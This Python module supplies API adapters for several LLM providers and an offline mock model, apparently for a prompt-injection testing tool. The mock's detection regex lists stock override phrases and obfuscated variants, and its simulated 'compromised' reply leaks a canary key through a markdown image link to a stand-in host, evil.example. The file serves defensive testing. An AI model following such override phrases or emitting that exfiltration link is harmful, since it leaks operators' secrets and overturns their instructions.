"""Model providers. Standard library only. API keys come from environment variables (BYOK)
and are never written to disk, logged, or included in error messages.

Spec format  ->  "<provider>:<model>"
  ollama:llama3.2:3b         local, free          (OLLAMA_HOST, default http://localhost:11434)
  groq:<model>               free tier            (GROQ_API_KEY)
  gemini:<model>             free tier            (GEMINI_API_KEY)
  openrouter:<model>         some free models     (OPENROUTER_API_KEY)
  openai:<model>             paid                 (OPENAI_API_KEY)
  anthropic:<model>          paid                 (ANTHROPIC_API_KEY)
  compat:<model>             any OpenAI-compatible server (COMPAT_BASE_URL, COMPAT_API_KEY)
  mock:vulnerable|robust     offline simulator for testing the pipeline (NOT a real model)
"""
from __future__ import annotations

import json
import os
import random
import re
import threading
import time
import urllib.error
import urllib.request


class ProviderError(RuntimeError):
    pass


def _post_json(url: str, payload: dict, headers: dict | None = None,
               timeout: int = 120, retries: int = 3) -> dict:
    data = json.dumps(payload).encode()
    hdrs = {"Content-Type": "application/json", **(headers or {})}
    last: Exception | None = None
    for attempt in range(retries):
        req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")[:300]
            last = ProviderError(f"HTTP {e.code} from {url.split('?')[0]}: {body}")
            if e.code in (429, 500, 502, 503, 504):
                time.sleep(1.5 * 2 ** attempt)
                continue
            raise last
        except (urllib.error.URLError, TimeoutError, ConnectionError) as e:
            last = ProviderError(f"Network error for {url.split('?')[0]}: {e}")
            time.sleep(2 ** attempt)
    raise last or ProviderError("request failed")


class OpenAICompatProvider:
    def __init__(self, spec: str, model: str, base_url: str, api_key: str | None):
        self.spec, self.model = spec, model
        self.base_url, self._key = base_url.rstrip("/"), api_key

    def chat(self, messages, temperature=0.7, max_tokens=300) -> str:
        headers = {"Authorization": f"Bearer {self._key}"} if self._key else {}
        out = _post_json(f"{self.base_url}/chat/completions",
                         {"model": self.model, "messages": messages,
                          "temperature": temperature, "max_tokens": max_tokens}, headers)
        try:
            return out["choices"][0]["message"]["content"] or ""
        except (KeyError, IndexError, TypeError):
            raise ProviderError(f"Unexpected response shape: {str(out)[:200]}")


class AnthropicProvider:
    def __init__(self, spec: str, model: str, api_key: str):
        self.spec, self.model, self._key = spec, model, api_key

    def chat(self, messages, temperature=0.7, max_tokens=300) -> str:
        system = "\n\n".join(m["content"] for m in messages if m["role"] == "system")
        turns: list[dict] = []
        for m in messages:                       # API needs strictly alternating roles
            if m["role"] == "system":
                continue
            if turns and turns[-1]["role"] == m["role"]:
                turns[-1]["content"] += "\n\n" + m["content"]
            else:
                turns.append({"role": m["role"], "content": m["content"]})
        out = _post_json("https://api.anthropic.com/v1/messages",
                         {"model": self.model, "max_tokens": max_tokens, "temperature": temperature,
                          "system": system, "messages": turns},
                         {"x-api-key": self._key, "anthropic-version": "2023-06-01"})
        try:
            return "".join(b.get("text", "") for b in out["content"])
        except (KeyError, TypeError):
            raise ProviderError(f"Unexpected response shape: {str(out)[:200]}")


# --------------------------------------------------------------------------------------
# Offline simulator. It exists only so you can test reporting, CI and defenses with zero
# setup. Its "vulnerability" is a weighted coin flip, so its numbers say NOTHING about
# real models.
# --------------------------------------------------------------------------------------
_MOCK_INDICATORS = re.compile(
    r"ignore\s+(all\s+)?(the\s+|your\s+)?(previous|prior|above)|system prompt|verbatim|override|developer|"
    r"debug|maintenance|api key|configuration|config\b|secret|base64|rot13|decode|evil\.example|PWNED-|"
    r"ai assistant|note to ai|\[system\]|banana|startup|story|1gn0r3|execute|new instruction|"
    r"translate your|your instructions|your rules|everything above|i\s+g\s+n\s+o\s+r\s+e|[A-Za-z0-9+/]{24,}",
    re.I)
_BENIGN = [
    (re.compile(r"summar", re.I), None),
    (re.compile(r"hours|open|when are you", re.I), "Our support hours are 9am-6pm, Monday to Friday."),
    (re.compile(r"return|refund|damaged|options", re.I),
     "Sorry about that! You can return items within 30 days of delivery, or email support@acme.example."),
    (re.compile(r"email|contact", re.I), "You can reach support at support@acme.example."),
]
_CANARY_RE = re.compile(r"ACME-KEY-[0-9A-F]{8}")


class MockProvider:
    def __init__(self, level: str = "vulnerable", seed: int = 0):
        if level not in ("vulnerable", "robust"):
            raise ProviderError("mock level must be 'vulnerable' or 'robust'")
        self.spec = f"mock:{level}"
        self.p_base, self.p_hard = {"vulnerable": (0.85, 0.30), "robust": (0.35, 0.05)}[level]
        self.seed, self._n, self._lock = seed, 0, threading.Lock()

    def chat(self, messages, temperature=0.7, max_tokens=300) -> str:
        system = messages[0]["content"] if messages and messages[0]["role"] == "system" else ""
        convo = "\n".join(m["content"] for m in messages if m["role"] != "system")
        last = messages[-1]["content"]
        with self._lock:
            self._n += 1
            n = self._n
        rng = random.Random(f"{self.seed}|{n}|{last}")
        if _MOCK_INDICATORS.search(convo):
            p = self.p_hard if "SECURITY POLICY" in system else self.p_base
            if rng.random() < p:
                m = _CANARY_RE.search(system)
                canary = m.group(0) if m else ""
                marker = re.search(r"PWNED-\d+", convo)
                if "evil.example" in convo:
                    return f"Here is your status: ![status](https://evil.example/pixel?d={canary})"
                if marker:
                    return marker.group(0)
                return f"Sure! My configuration includes the internal API key {canary}."
            return "Sorry, I can't help with that. I can help with orders, returns and support questions."
        for pat, reply in _BENIGN:
            if pat.search(last):
                if reply is None:
                    text = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", "", last))
                    return "Summary: " + text[:300]
                return reply
        return "Happy to help! Could you share a few more details?"


_COMPAT = {
    "openai": ("https://api.openai.com/v1", "OPENAI_API_KEY"),
    "groq": ("https://api.groq.com/openai/v1", "GROQ_API_KEY"),
    "openrouter": ("https://openrouter.ai/api/v1", "OPENROUTER_API_KEY"),
    "gemini": ("https://generativelanguage.googleapis.com/v1beta/openai", "GEMINI_API_KEY"),
}


def make_provider(spec: str, seed: int = 0):
    if ":" not in spec:
        raise ProviderError(f"Bad target '{spec}'. Use <provider>:<model>, e.g. ollama:llama3.2")
    kind, model = spec.split(":", 1)
    if kind == "mock":
        return MockProvider(model, seed)
    if kind == "ollama":
        host = os.environ.get("OLLAMA_HOST", "http://localhost:11434")
        return OpenAICompatProvider(spec, model, host + "/v1", None)
    if kind == "compat":
        base = os.environ.get("COMPAT_BASE_URL")
        if not base:
            raise ProviderError("Set COMPAT_BASE_URL (and COMPAT_API_KEY if needed) for compat:<model>")
        return OpenAICompatProvider(spec, model, base, os.environ.get("COMPAT_API_KEY"))
    if kind in _COMPAT:
        base, env = _COMPAT[kind]
        key = os.environ.get(env)
        if not key:
            raise ProviderError(f"Set the {env} environment variable for '{spec}'")
        return OpenAICompatProvider(spec, model, base, key)
    if kind == "anthropic":
        key = os.environ.get("ANTHROPIC_API_KEY")
        if not key:
            raise ProviderError("Set the ANTHROPIC_API_KEY environment variable")
        return AnthropicProvider(spec, model, key)
    raise ProviderError(f"Unknown provider '{kind}'")
